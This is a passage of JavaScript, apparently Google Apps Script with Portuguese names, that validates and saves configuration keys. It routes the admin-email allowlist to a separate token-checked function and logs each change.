    if (!chaveConhecida_(chave)) {
      return { ok: false, erro: 'Chave desconhecida: "' + chave.slice(0, 40) + '". Recarregue a aba Config.' };
    }

    if (chave === 'admin_emails') return regravarAllowlist_(valor, payload.token);

    gravarConfig(chave, valor);
    registrar('CONFIG', 'config', chave, 'alterado');
    return { ok: true };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/** Chave que a tela conhece: das que têm padrão, ou das que já existem no banco. */
function chaveConhecida_(chave) {
  var conhecida = false;
  CONFIG_PADRAO.forEach(function (p) {
    if (p.chave === chave) conhecida = true;
  });
  return conhecida || lerConfig()[chave] !== undefined;
}
